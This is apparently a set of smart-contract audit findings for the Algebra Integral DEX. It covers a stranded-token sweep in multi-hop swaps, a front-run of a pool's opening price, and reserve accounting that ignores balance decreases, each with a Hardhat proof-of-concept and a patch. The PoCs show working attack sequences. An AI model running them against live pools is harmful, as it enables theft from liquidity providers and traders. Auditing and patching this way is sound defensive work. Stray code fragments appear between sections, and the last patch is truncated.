## Description

An exact-input multi-hop route sends each intermediate output to the router and then treats that full returned amount as the next hop's input. Algebra pools may legally stop at the default extreme price limit after spending only part of an exact-input amount, and the callback charges the router only the amount actually spent. The router replaces `params.amountIn` with the next hop's output without tracking or returning the difference between the intermediate balance received and the amount paid. That unspent intermediate token therefore remains in the router after an otherwise successful route. Because `sweepToken` is permissionless and transfers the router's entire token balance to an arbitrary recipient, a back-runner can take the stranded remainder.
## Root cause

`exactInput` assumes every downstream hop consumes its entire router-custodied input, but the core pool permits partial exact-input fills at the price limit. No per-hop balance reconciliation or refund handles the resulting intermediate-token remainder.
## Impact

A user can lose the unspent portion of an intermediate hop whenever that hop exhausts available liquidity before consuming its nominal input while the route's final minimum-output check still passes. Any account can back-run the successful route and sweep those tokens to itself.
## Proof of concept
### Test case

```
import { MaxUint256, ZeroAddress } from 'ethers';
import { ethers } from 'hardhat';
import { loadFixture } from '@nomicfoundation/hardhat-network-helpers';

import completeFixture from './shared/completeFixture';
import { encodePriceSqrt } from './shared/encodePriceSqrt';
import { expect } from './shared/expect';
import { encodePath } from './shared/path';
import poolAtAddress from './shared/poolAtAddress';

describe('PoC: exactInput multihop strands partially spent intermediate tokens', function () {
  this.timeout(40_000);

  const MIN_TICK = -887272;
  const MAX_TICK = 887272;
  const LARGE_LIQUIDITY_TOKEN_AMOUNT = 10n ** 30n;
  const SMALL_SECOND_HOP_LIQUIDITY_AMOUNT = 1_000n;
  const TRADER_INPUT_AMOUNT = 30_000_000_000_000_000_000_000n; // 3e22

  it('leaves unspent intermediate token in SwapRouter and lets any caller sweep it', async () => {
    const [owner, trader, attacker] = await ethers.getSigners();
    const { factory, nft, router, tokens } = await loadFixture(completeFixture);
    const [token0, token1, token2] = tokens;
    const [token0Address, token1Address, token2Address, routerAddress] = await Promise.all([
      token0.getAddress(),
      token1.getAddress(),
      token2.getAddress(),
      router.getAddress(),
    ]);

    for (const token of tokens) {
      await token.approve(await nft.getAddress(), MaxUint256);
      await token.transfer(trader.address, LARGE_LIQUIDITY_TOKEN_AMOUNT);
      await token.connect(trader).approve(routerAddress, MaxUint256);
    }

    // Create the first pool with deep liquidity so the first hop returns far more token1
    // than the shallow second pool can consume before it reaches the router's default
    // exact-input price limit.
    await nft.createAndInitializePoolIfNecessary(token0Address, token1Address, encodePriceSqrt(1, 1));
    const firstPoolAddress = await factory.poolByPair(token0Address, token1Address);
    const firstPool = poolAtAddress(firstPoolAddress, owner as any);
    await firstPool.setTickSpacing(1);
    await nft.mint({
      token0: token0Address,
      token1: token1Address,
      deployer: ZeroAddress,
      tickLower: MIN_TICK,
      tickUpper: MAX_TICK,
      amount0Desired: LARGE_LIQUIDITY_TOKEN_AMOUNT,
      amount1Desired: LARGE_LIQUIDITY_TOKEN_AMOUNT,
      amount0Min: 0,
      amount1Min: 0,
      recipient: owner.address,
      deadline: 1,
    });

    // Create the second pool with tiny full-range liquidity. With tick spacing set to
    // 1, MIN_TICK/MAX_TICK positions remain active up to MIN_SQRT_RATIO+1, allowing
    // the pool to stop at the default router limit after spending only part of the
    // exact input amount instead of reverting in a zero-liquidity region.
    await nft.createAndInitializePoolIfNecessary(token1Address, token2Address, encodePriceSqrt(1, 1));
    const secondPoolAddress = await factory.poolByPair(token1Address, token2Address);
    const secondPool = poolAtAddress(secondPoolAddress, owner as any);
    await secondPool.setTickSpacing(1);
    await nft.mint({
      token0: token1Address,
      token1: token2Address,
      deployer: ZeroAddress,
      tickLower: MIN_TICK,
      tickUpper: MAX_TICK,
      amount0Desired: SMALL_SECOND_HOP_LIQUIDITY_AMOUNT,
      amount1Desired: SMALL_SECOND_HOP_LIQUIDITY_AMOUNT,
      amount0Min: 0,
      amount1Min: 0,
      recipient: owner.address,
      deadline: 1,
    });

    expect(await token1.balanceOf(routerAddress)).to.equal(0n);
    const firstPoolToken1Before = await token1.balanceOf(firstPoolAddress);
    const secondPoolToken1Before = await token1.balanceOf(secondPoolAddress);
    const traderToken0Before = await token0.balanceOf(trader.address);
    const traderToken2Before = await token2.balanceOf(trader.address);

    await router.connect(trader).exactInput({
      path: encodePath([token0Address, token1Address, token2Address]),
      recipient: trader.address,
      deadline: 1,
      amountIn: TRADER_INPUT_AMOUNT,
      amountOutMinimum: 1,
    });

    const firstPoolToken1After = await token1.balanceOf(firstPoolAddress);
    const secondPoolToken1After = await token1.balanceOf(secondPoolAddress);
    const strandedIntermediate = await token1.balanceOf(routerAddress);
    const firstHopIntermediateOutput = firstPoolToken1Before - firstPoolToken1After;
    const secondHopIntermediatePaid = secondPoolToken1After - secondPoolToken1Before;

    expect(await token0.balanceOf(trader.address)).to.equal(traderToken0Before - TRADER_INPUT_AMOUNT);
    expect(await token2.balanceOf(trader.address)).to.be.gt(traderToken2Before);
    expect(firstHopIntermediateOutput).to.be.gt(secondHopIntermediatePaid);
    expect(strandedIntermediate).to.equal(firstHopIntermediateOutput - secondHopIntermediatePaid);
    expect(strandedIntermediate).to.be.gt(0n);

    const attackerToken1Before = await token1.balanceOf(attacker.address);
    await router.connect(attacker).sweepToken(token1Address, strandedIntermediate, attacker.address);

    expect(await token1.balanceOf(routerAddress)).to.equal(0n);
    expect(await token1.balanceOf(attacker.address)).to.equal(attackerToken1Before + strandedIntermediate);
  });
});
```

The setup creates controlled test pools and configures tick spacing/liquidity to make the second hop reach the router's default price limit with unspent exact-input; the exploit transaction and sweep are both public entry-point calls. ### Validation reasoning

## Remediation
### Explanation

For every router-funded downstream exact-input hop, snapshot the router's pre-route balance excluding that hop's nominal input, then refund only the post-swap balance increase to the original caller. This reconciles partial fills while preserving unrelated pre-existing balances and normal fully consumed routes.
### Patch

```diff
diff --git a/src/periphery/contracts/SwapRouter.sol b/src/periphery/contracts/SwapRouter.sol
--- a/src/periphery/contracts/SwapRouter.sol
+++ b/src/periphery/contracts/SwapRouter.sol
@@ -1,242 +1,254 @@
 // SPDX-License-Identifier: GPL-2.0-or-later
 pragma solidity =0.8.20;
 
 import '@cryptoalgebra/integral-core/contracts/libraries/SafeCast.sol';
 import '@cryptoalgebra/integral-core/contracts/libraries/TickMath.sol';
 import '@cryptoalgebra/integral-core/contracts/interfaces/IAlgebraPool.sol';
 import '@cryptoalgebra/integral-core/contracts/interfaces/IAlgebraFactory.sol';
 
 import './interfaces/ISwapRouter.sol';
 import './base/PeripheryImmutableState.sol';
 import './base/PeripheryValidation.sol';
 import './base/PeripheryPaymentsWithFee.sol';
 import './base/Multicall.sol';
 import './base/SelfPermit.sol';
 import './libraries/Path.sol';
 import './libraries/CallbackValidation.sol';
+import './libraries/TransferHelper.sol';
 
 /// @title Algebra Integral 1.0 Swap Router
 /// @notice Router for stateless execution of swaps against Algebra
 /// @dev Credit to Uniswap Labs under GPL-2.0-or-later license:
 /// https://github.com/Uniswap/v3-periphery
 contract SwapRouter is
     ISwapRouter,
     PeripheryImmutableState,
     PeripheryValidation,
     PeripheryPaymentsWithFee,
     Multicall,
     SelfPermit
 {
     using Path for bytes;
     using SafeCast for uint256;
 
     /// @dev Used as the placeholder value for amountInCached, because the computed amount in for an exact output swap
     /// can never actually be this value
     uint256 private constant DEFAULT_AMOUNT_IN_CACHED = type(uint256).max;
 
     /// @dev Transient storage variable used for returning the computed amount in for an exact output swap.
     uint256 private amountInCached = DEFAULT_AMOUNT_IN_CACHED;
 
     constructor(address _factory, address _WNativeToken, address _poolDeployer) PeripheryImmutableState(_factory, _WNativeToken, _poolDeployer) {}
 
     /// @dev Returns the pool for the given token pair. The pool contract may or may not exist.
     function getPool(address deployer, address tokenA, address tokenB) private view returns (IAlgebraPool) {
         return
             IAlgebraPool(
                 deployer == address(0)
                     ? IAlgebraFactory(factory).poolByPair(tokenA, tokenB)
                     : IAlgebraFactory(factory).customPoolByPair(deployer, tokenA, tokenB)
             );
     }
 
     struct SwapCallbackData {
         bytes path;
         address payer;
     }
 
     /// @inheritdoc IAlgebraSwapCallback
     function algebraSwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata _data) external override {
         require(amount0Delta > 0 || amount1Delta > 0, 'Zero liquidity swap'); // swaps entirely within 0-liquidity regions are not supported
         SwapCallbackData memory data = abi.decode(_data, (SwapCallbackData));
         (address tokenIn, address deployer, address tokenOut) = data.path.decodeFirstPool();
         CallbackValidation.verifyCallback(factory, deployer, tokenIn, tokenOut);
 
         (bool isExactInput, uint256 amountToPay) = amount0Delta > 0
             ? (tokenIn < tokenOut, uint256(amount0Delta))
             : (tokenOut < tokenIn, uint256(amount1Delta));
         if (isExactInput) {
             pay(tokenIn, data.payer, msg.sender, amountToPay);
         } else {
             // either initiate the next swap or pay
             if (data.path.hasMultiplePools()) {
                 data.path = data.path.skipToken();
                 exactOutputInternal(amountToPay, msg.sender, 0, data);
             } else {
                 amountInCached = amountToPay;
                 tokenIn = tokenOut; // swap in/out because exact output swaps are reversed
                 pay(tokenIn, data.payer, msg.sender, amountToPay);
             }
         }
     }
 
     /// @dev Performs a single exact input swap
     function exactInputInternal(
         uint256 amountIn,
         address recipient,
         uint160 limitSqrtPrice,
         SwapCallbackData memory data
     ) private returns (uint256 amountOut) {
         if (recipient == address(0)) recipient = address(this); // allow swapping to the router address with address 0
 
         (address tokenIn, address deployer, address tokenOut) = data.path.decodeFirstPool();
 
         bool zeroToOne = tokenIn < tokenOut;
 
         (int256 amount0, int256 amount1) = getPool(deployer, tokenIn, tokenOut).swap(
             recipient,
             zeroToOne,
             amountIn.toInt256(),
             limitSqrtPrice == 0
                 ? (zeroToOne ? TickMath.MIN_SQRT_RATIO + 1 : TickMath.MAX_SQRT_RATIO - 1)
                 : limitSqrtPrice,
             abi.encode(data)
         );
 
         return uint256(-(zeroToOne ? amount1 : amount0));
     }
 
     /// @inheritdoc ISwapRouter
     function exactInputSingle(
         ExactInputSingleParams calldata params
     ) external payable override checkDeadline(params.deadline) returns (uint256 amountOut) {
         amountOut = exactInputInternal(
             params.amountIn,
             params.recipient,
             params.limitSqrtPrice,
             SwapCallbackData({path: abi.encodePacked(params.tokenIn, params.deployer, params.tokenOut), payer: msg.sender})
         );
         require(amountOut >= params.amountOutMinimum, 'Too little received');
     }
 
     /// @inheritdoc ISwapRouter
     function exactInput(
         ExactInputParams memory params
     ) external payable override checkDeadline(params.deadline) returns (uint256 amountOut) {
         address payer = msg.sender; // msg.sender pays for the first hop
 
         while (true) {
             bool hasMultiplePools = params.path.hasMultiplePools();
+            address tokenIn;
+            uint256 balanceBefore;
+            if (payer == address(this)) {
+                (tokenIn, , ) = params.path.decodeFirstPool();
+                balanceBefore = IERC20(tokenIn).balanceOf(address(this)) - params.amountIn;
+            }
 
             // the outputs of prior swaps become the inputs to subsequent ones
             params.amountIn = exactInputInternal(
                 params.amountIn,
                 hasMultiplePools ? address(this) : params.recipient, // for intermediate swaps, this contract custodies
                 0,
                 SwapCallbackData({path: params.path.getFirstPool(), payer: payer})
             );
 
+            if (payer == address(this)) {
+                uint256 unspentAmount = IERC20(tokenIn).balanceOf(address(this)) - balanceBefore;
+                if (unspentAmount > 0) TransferHelper.safeTransfer(tokenIn, msg.sender, unspentAmount);
+            }
+
             // decide whether to continue or terminate
             if (hasMultiplePools) {
                 payer = address(this); // at this point, the caller has paid
                 params.path = params.path.skipToken();
             } else {
                 amountOut = params.amountIn;
                 break;
             }
         }
 
         require(amountOut >= params.amountOutMinimum, 'Too little received');
     }
 
     /// @inheritdoc ISwapRouter
     function exactInputSingleSupportingFeeOnTransferTokens(
         ExactInputSingleParams calldata params
     ) external payable override checkDeadline(params.deadline) returns (uint256 amountOut) {
         SwapCallbackData memory data = SwapCallbackData({
             path: abi.encodePacked(params.tokenIn, params.deployer, params.tokenOut),
             payer: msg.sender
         });
         address recipient = params.recipient == address(0) ? address(this) : params.recipient;
 
         bool zeroToOne = params.tokenIn < params.tokenOut;
 
         (int256 amount0, int256 amount1) = getPool(params.deployer, params.tokenIn, params.tokenOut).swapWithPaymentInAdvance(
             msg.sender,
             recipient,
             zeroToOne,
             params.amountIn.toInt256(),
             params.limitSqrtPrice == 0
                 ? (zeroToOne ? TickMath.MIN_SQRT_RATIO + 1 : TickMath.MAX_SQRT_RATIO - 1)
                 : params.limitSqrtPrice,
             abi.encode(data)
         );
 
         amountOut = uint256(-(zeroToOne ? amount1 : amount0));
 
         require(amountOut >= params.amountOutMinimum, 'Too little received');
     }
 
     /// @dev Performs a single exact output swap
     function exactOutputInternal(
         uint256 amountOut,
         address recipient,
         uint160 limitSqrtPrice,
         SwapCallbackData memory data
     ) private returns (uint256 amountIn) {
         if (recipient == address(0)) recipient = address(this); // allow swapping to the router address with address 0
 
         (address tokenOut, address deployer, address tokenIn) = data.path.decodeFirstPool();
 
         bool zeroToOne = tokenIn < tokenOut;
 
         (int256 amount0Delta, int256 amount1Delta) = getPool(deployer, tokenIn, tokenOut).swap(
             recipient,
             zeroToOne,
             -amountOut.toInt256(),
             limitSqrtPrice == 0
                 ? (zeroToOne ? TickMath.MIN_SQRT_RATIO + 1 : TickMath.MAX_SQRT_RATIO - 1)
                 : limitSqrtPrice,
             abi.encode(data)
         );
 
         uint256 amountOutReceived;
         (amountIn, amountOutReceived) = zeroToOne
             ? (uint256(amount0Delta), uint256(-amount1Delta))
             : (uint256(amount1Delta), uint256(-amount0Delta));
         if (limitSqrtPrice == 0) require(amountOutReceived == amountOut, 'Not received full amountOut');
     }
 
     /// @inheritdoc ISwapRouter
     function exactOutputSingle(
         ExactOutputSingleParams calldata params
     ) external payable override checkDeadline(params.deadline) returns (uint256 amountIn) {
         // avoid an SLOAD by using the swap return data
         amountIn = exactOutputInternal(
             params.amountOut,
             params.recipient,
             params.limitSqrtPrice,
             SwapCallbackData({path: abi.encodePacked(params.tokenOut, params.deployer, params.tokenIn), payer: msg.sender})
         );
 
         require(amountIn <= params.amountInMaximum, 'Too much requested');
         amountInCached = DEFAULT_AMOUNT_IN_CACHED; // has to be reset even though we don't use it in the single hop case
     }
 
     /// @inheritdoc ISwapRouter
     function exactOutput(
         ExactOutputParams calldata params
     ) external payable override checkDeadline(params.deadline) returns (uint256 amountIn) {
         // it's okay that the payer is fixed to msg.sender here, as they're only paying for the "final" exact output
         // swap, which happens first, and subsequent swaps are paid for within nested callback frames
         exactOutputInternal(
             params.amountOut,
             params.recipient,
             0,
             SwapCallbackData({path: params.path, payer: msg.sender})
         );
 
         amountIn = amountInCached;
         require(amountIn <= params.amountInMaximum, 'Too much requested');
         amountInCached = DEFAULT_AMOUNT_IN_CACHED;
     }
 }
```

```
    function createAndInitializePoolIfNecessary(
        address token0,
        address token1,
        uint160 sqrtPriceX96
    ) external payable override returns (address pool) {
        require(token0 < token1, 'Invalid order of tokens');

        pool = IAlgebraFactory(factory).poolByPair(token0, token1);

        if (pool == address(0)) {
            pool = IAlgebraFactory(factory).createPool(token0, token1);

            _initializePool(pool, sqrtPriceX96);
        } else {
            uint160 sqrtPriceX96Existing = IAlgebraPool(pool)._getSqrtPrice();
            if (sqrtPriceX96Existing == 0) {
                _initializePool(pool, sqrtPriceX96);
            }
        }
    }

    function _initializePool(address pool, uint160 initPrice) private {
        IAlgebraPool(pool).initialize(initPrice);
    }
```

```
  /// @dev Throws in case price < MIN_SQRT_RATIO, as MIN_SQRT_RATIO is the lowest value getRatioAtTick may

  function getTickAtSqrtRatio(uint160 price) internal pure returns (int24 tick) {
```

```
    poolByPair[token0][token1] = pool; // to avoid future addresses comparison we are populating the mapping twice
    poolByPair[token1][token0] = pool;
    emit Pool(token0, token1, pool);

    if (address(vaultFactory) != address(0)) {
      vaultFactory.createVaultForPool(pool);
    }
  }
```

```
      creator,
      customDeployer,
      token0,
      token1,
      data
    );

    customPool = IAlgebraPoolDeployer(poolDeployer).deploy(plugin, token0, token1, customDeployer);

    IAlgebraPluginFactory(msg.sender).afterCreatePoolHook(plugin, customPool, customDeployer);

    customPoolByPair[customDeployer][token0][token1] = customPool;
    customPoolByPair[customDeployer][token1][token0] = customPool;
    deployerByPool[customPool] = customDeployer;
    emit CustomPool(customDeployer, token0, token1, customPool);

    if (address(vaultFactory) != address(0)) {

  }
```

## Description

Classic and custom pool creation paths deploy and register pools without committing an initial price, while the custom plugin factory and entry point likewise complete deployment without an initialization step. `AlgebraPool.initialize` allows any caller to supply the first valid price whenever `globalState.price` is zero, after which later initialization is permanently rejected. An observer can therefore initialize a newly created or otherwise uninitialized pool before its intended creator or bootstrapper and establish an attacker-selected opening price. Although `createAndInitializePoolIfNecessary` is atomic when it itself creates a classic pool, its existing-pool branch treats any nonzero price as success and does not require it to equal the caller's `sqrtPriceX96`. Subsequent liquidity calculations read that stored price, so a bundled or later first mint can use the attacker-selected rate rather than the rate expected by the liquidity provider.
## Root cause

Pool deployment leaves a public uninitialized interval while `initialize` grants the first caller irreversible price-setting authority, and `createAndInitializePoolIfNecessary` does not validate that an already initialized pool's price equals `sqrtPriceX96`.
## Impact

An attacker can permanently replace the intended opening rate and cause the intended initialization transaction to revert or silently leave a helper caller with a different price than requested. If first liquidity is provided with insufficiently restrictive amount bounds, it can be deposited in an unintended token ratio and then arbitraged as the pool price is corrected; restrictive bounds instead allow the attack to deny the intended bootstrap transaction.
## Proof of concept
### Test case

```
import { MaxUint256, ZeroAddress } from 'ethers';
import { ethers } from 'hardhat';
import { loadFixture } from '@nomicfoundation/hardhat-network-helpers';

import completeFixture from './shared/completeFixture';
import { encodePriceSqrt } from './shared/encodePriceSqrt';
import { expect } from './shared/expect';
import poolAtAddress from './shared/poolAtAddress';

describe('PoC: pool initialization opening-price front-run', function () {
  this.timeout(40_000);

  it('lets an observer permanently set the opening price before the intended initializer and skew the first mint', async () => {
    const [creator, attacker, victim] = await ethers.getSigners();
    const { factory, nft, tokens } = await loadFixture(completeFixture);
    const [token0, token1, token2] = tokens;
    const [token0Address, token1Address, token2Address] = await Promise.all([
      token0.getAddress(),
      token1.getAddress(),
      token2.getAddress(),
    ]);

    const poolPrice = async (pool: any): Promise<bigint> => {
      const globalState = await pool.globalState();
      return globalState.price ?? globalState[0];
    };

    // The fixture enables public classic-pool creation, so a creator can publish a pool
    // without an initial price and every observer can learn the registered address.
    await factory.connect(creator).createPool(token0Address, token1Address);
    const attackedPoolAddress = await factory.poolByPair(token0Address, token1Address);
    expect(attackedPoolAddress).to.not.equal(ZeroAddress);

    const attackedPool = poolAtAddress(attackedPoolAddress, attacker as any);
    expect(await poolPrice(attackedPool)).to.equal(0n);

    // The attacker wins the public initialization race with a price far above the
    // victim's intended 1:1 bootstrap price.
    const victimIntendedPrice = encodePriceSqrt(1, 1);
    const attackerOpeningPrice = encodePriceSqrt(4, 1);
    await attackedPool.connect(attacker).initialize(attackerOpeningPrice);

    // The legitimate first initializer can no longer restore its intended price.
    await expect(attackedPool.connect(victim).initialize(victimIntendedPrice)).to.be.reverted;

    // The position manager's helper observes a nonzero price and silently treats the
    // pool as initialized, instead of enforcing that it matches victimIntendedPrice.
    await nft.connect(victim).createAndInitializePoolIfNecessary(token0Address, token1Address, victimIntendedPrice);
    expect(await poolPrice(attackedPool)).to.equal(attackerOpeningPrice);

    // Control: the same narrow-range first-mint request at the intended price would
    // require both tokens when the pool is initialized atomically and honestly.
    await nft.connect(victim).createAndInitializePoolIfNecessary(token0Address, token2Address, victimIntendedPrice);
    await token0.transfer(victim.address, 10_000_000n);
    await token1.transfer(victim.address, 10_000_000n);
    await token2.transfer(victim.address, 10_000_000n);
    await token0.connect(victim).approve(await nft.getAddress(), MaxUint256);
    await token1.connect(victim).approve(await nft.getAddress(), MaxUint256);
    await token2.connect(victim).approve(await nft.getAddress(), MaxUint256);

    const tickLower = -60;
    const tickUpper = 60;
    const desiredLiquidityParams = {
      deployer: ZeroAddress,
      tickLower,
      tickUpper,
      amount0Desired: 1_000_000n,
      amount1Desired: 1_000_000n,
      amount0Min: 0n,
      amount1Min: 0n,
      recipient: victim.address,
      deadline: 1,
    };

    const honestQuote = await nft.connect(victim).mint.staticCall({
      ...desiredLiquidityParams,
      token0: token0Address,
      token1: token2Address,
    });
    expect(honestQuote.amount0).to.be.gt(0n);
    expect(honestQuote.amount1).to.be.gt(0n);

    // Strict slippage bounds turn the front-run into a denial of the victim's
    // bootstrap mint, because the attacked pool now prices the selected range wholly
    // in token1 rather than both tokens.
    await expect(
      nft.connect(victim).mint({
        ...desiredLiquidityParams,
        token0: token0Address,
        token1: token1Address,
        amount0Min: 1n,
        amount1Min: 1n,
      })
    ).to.be.revertedWith('Price slippage check');

    // With weak minima, the mint succeeds but the real LiquidityManagement/AlgebraPool
    // path derives owed amounts from the attacker's stored price: no token0 is funded
    // and token1 alone is deposited for the victim's first position.
    const attackedQuote = await nft.connect(victim).mint.staticCall({
      ...desiredLiquidityParams,
      token0: token0Address,
      token1: token1Address,
    });
    expect(attackedQuote.amount0).to.equal(0n);
    expect(attackedQuote.amount1).to.be.gt(0n);
    expect(honestQuote.amount0).to.be.gt(attackedQuote.amount0);

    const victimToken0Before = await token0.balanceOf(victim.address);
    const victimToken1Before = await token1.balanceOf(victim.address);
    await nft.connect(victim).mint({
      ...desiredLiquidityParams,
      token0: token0Address,
      token1: token1Address,
    });

    expect(await token0.balanceOf(victim.address)).to.equal(victimToken0Before);
    expect(await token1.balanceOf(victim.address)).to.equal(victimToken1Before - attackedQuote.amount1);
    const attackedPosition = await nft.positions(1);
    expect(attackedPosition.liquidity).to.be.gt(0n);
    expect(attackedPosition.token0).to.equal(token0Address);
    expect(attackedPosition.token1).to.equal(token1Address);
  });
});
```

### Considerations

PoC executed successfully with strategy `unit:cryptoalgebra-integral-periphery` via `npx hardhat test test/Poc.spec.ts` after `npm run compile`; it demonstrates the classic-pool path end-to-end. It does not separately execute the custom-pool deployment path, but the same public `AlgebraPool.initialize` primitive is reached after custom-pool creation leaves a pool uninitialized.
### Validation reasoning

PoC validation command completed successfully.
## Remediation
### Explanation

Require an already initialized classic pool's stored opening price to equal the caller-requested price, so a front-run initialization cannot be silently accepted before a bundled bootstrap/mint.
### Patch

```diff
diff --git a/src/periphery/contracts/base/PoolInitializer.sol b/src/periphery/contracts/base/PoolInitializer.sol
--- a/src/periphery/contracts/base/PoolInitializer.sol
+++ b/src/periphery/contracts/base/PoolInitializer.sol
@@ -1,42 +1,44 @@
 // SPDX-License-Identifier: GPL-2.0-or-later
 pragma solidity =0.8.20;
 
 import '@cryptoalgebra/integral-core/contracts/interfaces/IAlgebraFactory.sol';
 import '@cryptoalgebra/integral-core/contracts/interfaces/IAlgebraPool.sol';
 import './PeripheryImmutableState.sol';
 import '../interfaces/IPoolInitializer.sol';
 
 import '../libraries/PoolInteraction.sol';
 
 /// @title Creates and initializes Algebra Pools
 /// @dev Credit to Uniswap Labs under GPL-2.0-or-later license:
 /// https://github.com/Uniswap/v3-periphery
 abstract contract PoolInitializer is IPoolInitializer, PeripheryImmutableState {
     using PoolInteraction for IAlgebraPool;
 
     /// @inheritdoc IPoolInitializer
     function createAndInitializePoolIfNecessary(
         address token0,
         address token1,
         uint160 sqrtPriceX96
     ) external payable override returns (address pool) {
         require(token0 < token1, 'Invalid order of tokens');
 
         pool = IAlgebraFactory(factory).poolByPair(token0, token1);
 
         if (pool == address(0)) {
             pool = IAlgebraFactory(factory).createPool(token0, token1);
 
             _initializePool(pool, sqrtPriceX96);
         } else {
             uint160 sqrtPriceX96Existing = IAlgebraPool(pool)._getSqrtPrice();
             if (sqrtPriceX96Existing == 0) {
                 _initializePool(pool, sqrtPriceX96);
+            } else {
+                require(sqrtPriceX96Existing == sqrtPriceX96, 'Pool initialized with different price');
             }
         }
     }
 
     function _initializePool(address pool, uint160 initPrice) private {
         IAlgebraPool(pool).initialize(initPrice);
     }
 }
```

```
  function burn(
    int24 bottomTick,
    int24 topTick,
    uint128 amount,
    bytes calldata data
  ) external override onlyValidTicks(bottomTick, topTick) returns (uint256 amount0, uint256 amount1) {
    if (amount > uint128(type(int128).max)) revert arithmeticError();

    int128 liquidityDelta = -int128(amount);

    _beforeModifyPos(msg.sender, bottomTick, topTick, liquidityDelta, data);
    _lock();

    _updateReserves();
    Position storage position = getOrCreatePosition(msg.sender, bottomTick, topTick);

    (amount0, amount1) = _updatePositionTicksAndFees(position, bottomTick, topTick, liquidityDelta);

    if (amount0 | amount1 != 0) {
      // since we do not support tokens whose total supply can exceed uint128, these casts are safe
      // and, theoretically, unchecked cast prevents a complete blocking of burn
      (position.fees0, position.fees1) = (position.fees0 + uint128(amount0), position.fees1 + uint128(amount1));
    }

    if (amount | amount0 | amount1 != 0) emit Burn(msg.sender, bottomTick, topTick, amount, amount0, amount1);

    _unlock();
    _afterModifyPos(msg.sender, bottomTick, topTick, liquidityDelta, amount0, amount1, data);
```

### `src/core/contracts/interfaces/IERC20Minimal.sol`
#### Lines 8-18 — _The accepted token interface imposes no non-rebasing or balance-monotonicity guarantee._

```
interface IERC20Minimal {
  /// @notice Returns the balance of a token
  /// @param account The account for which to look up the number of tokens it has, i.e. its balance
  /// @return The number of tokens held by the account
  function balanceOf(address account) external view returns (uint256);

  /// @notice Transfers the amount of token from the `msg.sender` to the recipient
  /// @param recipient The account that will receive the amount transferred
  /// @param amount The number of tokens to send from the sender to the recipient
  /// @return Returns true for a successful transfer, false for an unsuccessful transfer
  function transfer(address recipient, uint256 amount) external returns (bool);
```
## Description

`_updateReserves` treats only balances above `reserve0` or `reserve1` as actionable, so a negative rebase or other external balance decrease leaves the reserve mirror above actual custody. The pool obtains these balances from arbitrary configured token contracts, while `mint` snapshots them, invokes `_mintCallback`, and derives payment receipts from the later balances without a negative-delta handling path. Consequently, a balance reduction during the callback can make receipt measurement fail or be invalid, while a reduction between calls leaves subsequent mint, burn, collect, swap, and flash accounting based on custody the pool no longer holds. The position manager and liquidity-management periphery route LP entry, exit, and collection through those core paths, propagating the discrepancy to NFT positions. The implementation needs one consistent balance-decrease policy: reject unsupported balance-changing token behavior or explicitly reconcile losses and validate every callback payment and reserve transition against observed balances.
## Root cause

`_updateReserves` only reconciles positive balance deltas and `mint` assumes its post-callback token balances cannot be lower than the pre-callback snapshot.
## Impact

A negatively rebasing or otherwise balance-decreasing token can prevent liquidity additions and leave LP principal or fee claims greater than the pool's actual token balance. Later swaps, collections, or withdrawals may fail once an output exceeds available custody, and users can be left unable to realize recorded claims unless the deficit is covered or the pool is otherwise repaired.
## Proof of concept
### Test case

```
import { ethers } from 'hardhat';
import { loadFixture } from '@nomicfoundation/hardhat-network-helpers';
import { MaxUint256 } from 'ethers';

import { expect } from './shared/expect';
import { poolFixture } from './shared/fixtures';
import { encodePriceSqrt, expandTo18Decimals, getMaxTick, getMinTick, MaxUint128 } from './shared/utilities';

describe('PoC: balance decreases leave Algebra pool reserves and LP claims unbacked', () => {
  it('burn credits a claim after token custody falls below stale reserves, then collect cannot pay it', async () => {
    const [wallet] = await ethers.getSigners();
    const { swapTargetCallee, createPool } = await loadFixture(poolFixture);

    const tokenFactory = await ethers.getContractFactory('PocBalanceDecreasingToken');
    const tokenA = await tokenFactory.deploy(2n ** 200n);
    const tokenB = await tokenFactory.deploy(2n ** 200n);

    const tokenAAddress = await tokenA.getAddress();
    const tokenBAddress = await tokenB.getAddress();
    const [token0, token1] = BigInt(tokenAAddress) < BigInt(tokenBAddress) ? [tokenA, tokenB] : [tokenB, tokenA];

    const pool = await createPool(token0 as any, token1 as any);
    const bottomTick = getMinTick(60);
    const topTick = getMaxTick(60);
    const liquidity = expandTo18Decimals(10);

    await pool.initialize(encodePriceSqrt(1, 1));
    await token0.approve(swapTargetCallee, MaxUint256);
    await token1.approve(swapTargetCallee, MaxUint256);
    await swapTargetCallee.mint(pool, wallet.address, bottomTick, topTick, liquidity);

    const [reserve0Before, reserve1Before] = await pool.getReserves();
    const custody0Before = await token0.balanceOf(pool);
    expect(reserve0Before).to.eq(custody0Before);
    expect(reserve1Before).to.eq(await token1.balanceOf(pool));
    expect(await pool.liquidity()).to.eq(liquidity);

    // Public token behavior models a negative rebase/balance decrease after the pool has recorded reserves.
    await token0.decreaseBalance(pool, custody0Before);
    expect(await token0.balanceOf(pool)).to.eq(0n);

    // The real AlgebraPool.burn entry point calls _updateReserves(), but the lower token0 balance is ignored.
    // It still burns all active liquidity and records the full nominal token0 amount as collectible fees.
    await pool.burn(bottomTick, topTick, liquidity, '0x');

    const [reserve0AfterBurn, reserve1AfterBurn] = await pool.getReserves();
    expect(reserve0AfterBurn).to.eq(reserve0Before);
    expect(reserve1AfterBurn).to.eq(reserve1Before);
    expect(await pool.liquidity()).to.eq(0n);

    const positionKey = await pool.getKeyForPosition(wallet.address, bottomTick, topTick);
    const positionAfterBurn = await pool.positions(positionKey);
    const actualCustody0 = await token0.balanceOf(pool);
    expect(positionAfterBurn.fees0).to.be.gt(actualCustody0);
    expect(positionAfterBurn.fees1).to.be.gt(0n);

    // The credited claim is now unbacked; collect reaches the real transfer path and fails when token0
    // cannot transfer the amount recorded in the position accounting.
    await expect(pool.collect(wallet.address, bottomTick, topTick, MaxUint128, MaxUint128)).to.be.revertedWithCustomError(
      pool,
      'transferFailed'
    );
  });
});
```

### Considerations

PoC executed successfully in the core Hardhat harness with `unit:cryptoalgebra-integral-core`. It demonstrates the core reserve/claim failure through real `AlgebraPool.mint`, `AlgebraPool.burn`, `_updateReserves`, and `AlgebraPool.collect` code using `MockTimeAlgebraPool`, whose only relevant deviation is the test timestamp override. The PoC proves the core underbacked-claim impact directly; it does not separately route the same state through `NonfungiblePositionManager`, though the manager ultimately delegates burn/collect to these core entry points.
### Validation reasoning

PoC validation command completed successfully.
## Remediation
### Explanation

Reject any observed token balance below its tracked reserve before pool accounting proceeds, including when active liquidity is zero, so unsupported negative balance changes cannot leave stale reserves or create new LP claims against missing custody.
### Patch

```diff
--- a/src/core/contracts/base/ReservesManager.sol
